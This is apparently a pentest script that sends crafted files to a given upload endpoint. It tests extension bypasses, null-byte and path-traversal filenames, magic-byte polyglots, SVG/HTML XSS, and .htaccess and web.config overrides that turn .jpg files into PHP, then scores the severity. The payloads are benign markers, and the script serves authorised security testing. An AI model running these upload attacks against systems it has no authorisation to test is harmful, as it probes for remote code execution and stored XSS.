#!/usr/bin/env python3
"""File upload security testing.

Tests for extension bypass, content-type manipulation, double extension,
path traversal in filename, null byte injection, magic bytes, and SVG XSS.

Usage:
    python3 test-file-upload.py '{"target": "https://example.com/upload", "field_name": "file", "auth_header": "Bearer ..."}'
"""

import sys
import json
import io
import requests
import urllib3
from urllib.parse import urlparse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

TIMEOUT = 15

# PHP web shell content (benign — just echoes a marker)
PHP_MARKER = '<?php echo "UPLOAD_TEST_MARKER_12345"; ?>'

# JSP marker
JSP_MARKER = '<%= "UPLOAD_TEST_MARKER_12345" %>'

# ASP marker
ASP_MARKER = '<% Response.Write("UPLOAD_TEST_MARKER_12345") %>'

# SVG with JavaScript
SVG_XSS = '''<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
  <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
  <script type="text/javascript">alert("UPLOAD_TEST_XSS");</script>
</svg>'''

# HTML file
HTML_XSS = '<html><body><script>alert("UPLOAD_TEST_XSS")</script></body></html>'

# Minimal valid file magic bytes
JPEG_MAGIC = b"\xff\xd8\xff\xe0" + b"\x00\x10JFIF\x00"
PNG_MAGIC = b"\x89PNG\r\n\x1a\n"
GIF_MAGIC = b"GIF89a"
PDF_MAGIC = b"%PDF-1.4"

# Test payloads: (filename, content, content_type, test_name, description)
def generate_test_cases():
    return [
        # Extension bypass - PHP
        ("test.php", PHP_MARKER.encode(), "application/x-php", "php_direct", "Direct PHP upload"),
        ("test.php.jpg", PHP_MARKER.encode(), "image/jpeg", "php_double_ext", "PHP with .jpg extension appended"),
        ("test.pHp", PHP_MARKER.encode(), "application/x-php", "php_mixed_case", "PHP with mixed case extension"),
        ("test.php5", PHP_MARKER.encode(), "application/x-php", "php5_ext", "PHP5 extension"),
        ("test.phtml", PHP_MARKER.encode(), "application/x-php", "phtml_ext", "PHTML extension"),
        ("test.php%00.jpg", PHP_MARKER.encode(), "image/jpeg", "php_null_byte", "PHP with null byte before .jpg"),
        ("test.php\x00.jpg", PHP_MARKER.encode(), "image/jpeg", "php_null_byte_raw", "PHP with raw null byte"),
        ("test.php.png", PHP_MARKER.encode(), "image/png", "php_png_ext", "PHP with .png extension"),

        # Extension bypass - JSP
        ("test.jsp", JSP_MARKER.encode(), "application/jsp", "jsp_direct", "Direct JSP upload"),
        ("test.jspx", JSP_MARKER.encode(), "application/jsp", "jspx_ext", "JSPX extension"),

        # Extension bypass - ASP
        ("test.asp", ASP_MARKER.encode(), "application/asp", "asp_direct", "Direct ASP upload"),
        ("test.aspx", ASP_MARKER.encode(), "application/asp", "aspx_ext", "ASPX extension"),

        # Content-Type manipulation
        ("test.jpg", PHP_MARKER.encode(), "image/jpeg", "ct_image_php", "PHP content with image/jpeg Content-Type"),
        ("test.png", PHP_MARKER.encode(), "image/png", "ct_image_png_php", "PHP content with image/png Content-Type"),
        ("test.gif", PHP_MARKER.encode(), "image/gif", "ct_image_gif_php", "PHP content with image/gif Content-Type"),

        # Magic bytes + malicious content
        ("test.jpg", JPEG_MAGIC + PHP_MARKER.encode(), "image/jpeg", "magic_jpeg_php", "JPEG magic bytes + PHP code"),
        ("test.png", PNG_MAGIC + PHP_MARKER.encode(), "image/png", "magic_png_php", "PNG magic bytes + PHP code"),
        ("test.gif", GIF_MAGIC + PHP_MARKER.encode(), "image/gif", "magic_gif_php", "GIF magic bytes + PHP code"),

        # Path traversal in filename
        ("../../../tmp/test.php", PHP_MARKER.encode(), "application/x-php", "path_traversal_unix", "Unix path traversal in filename"),
        ("..\\..\\..\\tmp\\test.php", PHP_MARKER.encode(), "application/x-php", "path_traversal_win", "Windows path traversal in filename"),
        ("....//....//tmp/test.php", PHP_MARKER.encode(), "application/x-php", "path_traversal_double", "Double-dot path traversal"),

        # SVG with JavaScript
        ("test.svg", SVG_XSS.encode(), "image/svg+xml", "svg_xss", "SVG with embedded JavaScript"),

        # HTML upload
        ("test.html", HTML_XSS.encode(), "text/html", "html_xss", "HTML with JavaScript"),

        # Polyglot files
        ("test.pdf", PDF_MAGIC + b"\n" + PHP_MARKER.encode(), "application/pdf", "pdf_php_polyglot", "PDF/PHP polyglot"),

        # Special filenames
        (".htaccess", b"AddType application/x-httpd-php .jpg\n", "text/plain", "htaccess_upload", ".htaccess override attempt"),
        ("web.config", b'<configuration><system.webServer><handlers><add name="PHP" path="*.jpg" verb="*" modules="FastCgiModule" scriptProcessor="php-cgi.exe" /></handlers></system.webServer></configuration>', "text/xml", "webconfig_upload", "web.config override attempt"),

        # Large file (boundary test)
        ("test.txt", b"A" * 1048576, "text/plain", "large_file_1mb", "1MB file to test size limits"),

        # Empty file
        ("test.php", b"", "application/x-php", "empty_php", "Empty PHP file"),
    ]


def upload_file(target, field_name, filename, content, content_type, headers=None):
    """Upload a file and analyze the response."""
    req_headers = headers or {}

    files = {
        field_name: (filename, io.BytesIO(content), content_type)
    }

    try:
        resp = requests.post(
            target,
            files=files,
            headers=req_headers,
            timeout=TIMEOUT,
            verify=False,
        )
    except requests.RequestException as e:
        return {"error": str(e)}

    result = {
        "status_code": resp.status_code,
        "content_length": len(resp.content),
        "response_preview": resp.text[:500],
        "response_headers": dict(resp.headers),
    }

    # Check for upload success indicators
    body_lower = resp.text.lower()

    result["upload_accepted"] = resp.status_code in (200, 201, 204, 302, 303)
    result["upload_rejected"] = resp.status_code in (400, 403, 415, 422)

    # Look for file URL in response
    if "url" in body_lower or "path" in body_lower or "location" in body_lower:
        result["may_contain_file_url"] = True
    else:
        result["may_contain_file_url"] = False

    # Check for error messages
    error_keywords = ["not allowed", "invalid", "rejected", "forbidden", "unsupported"]
    result["error_message_detected"] = any(kw in body_lower for kw in error_keywords)

    # Check for our marker in response (indicates execution)
    if "UPLOAD_TEST_MARKER_12345" in resp.text:
        result["code_executed"] = True
    else:
        result["code_executed"] = False

    if "UPLOAD_TEST_XSS" in resp.text:
        result["xss_reflected"] = True
    else:
        result["xss_reflected"] = False

    return result


def main():
    if len(sys.argv) < 2:
        print(json.dumps({"error": "Usage: test-file-upload.py '{\"target\": \"...\", \"field_name\": \"file\"}' "}))
        sys.exit(1)

    try:
        args = json.loads(sys.argv[1])
    except json.JSONDecodeError as e:
        print(json.dumps({"error": f"Invalid JSON arguments: {str(e)}"}))
        sys.exit(1)

    target = args.get("target")
    if not target:
        print(json.dumps({"error": "Missing required parameter: target"}))
        sys.exit(1)

    field_name = args.get("field_name", "file")
    auth_header = args.get("auth_header")
    custom_headers = args.get("headers", {})

    if auth_header:
        custom_headers["Authorization"] = auth_header

    test_cases = generate_test_cases()

    # Optional: filter to specific tests
    test_filter = args.get("tests")
    if test_filter:
        test_cases = [tc for tc in test_cases if tc[3] in test_filter]

    results = []
    accepted_uploads = []
    executed_code = []
    xss_reflected = []

    for filename, content, content_type, test_name, description in test_cases:
        resp = upload_file(target, field_name, filename, content, content_type, custom_headers)

        entry = {
            "test_name": test_name,
            "description": description,
            "filename": filename,
            "content_type": content_type,
            "content_size": len(content),
            **resp,
        }
        results.append(entry)

        if resp.get("upload_accepted"):
            accepted_uploads.append(test_name)
        if resp.get("code_executed"):
            executed_code.append(test_name)
        if resp.get("xss_reflected"):
            xss_reflected.append(test_name)

    # Determine severity
    severity = "info"
    if executed_code:
        severity = "critical"
    elif xss_reflected:
        severity = "high"
    elif "htaccess_upload" in accepted_uploads or "webconfig_upload" in accepted_uploads:
        severity = "high"
    elif any(t in accepted_uploads for t in ["php_direct", "jsp_direct", "asp_direct"]):
        severity = "high"
    elif any(t in accepted_uploads for t in ["path_traversal_unix", "path_traversal_win"]):
        severity = "high"
    elif accepted_uploads:
        severity = "medium"

    output = {
        "target": target,
        "field_name": field_name,
        "tests_run": len(results),
        "uploads_accepted": len(accepted_uploads),
        "code_executed": executed_code,
        "xss_reflected": xss_reflected,
        "accepted_tests": accepted_uploads,
        "severity": severity,
        "results": results,
        "summary": (
            f"Tested {len(results)} file upload payloads against {target}. "
            f"{len(accepted_uploads)} uploads accepted. "
            f"Code execution detected: {executed_code if executed_code else 'none'}. "
            f"XSS reflected: {xss_reflected if xss_reflected else 'none'}."
        ),
    }

    print(json.dumps(output, indent=2))


if __name__ == "__main__":
    main()
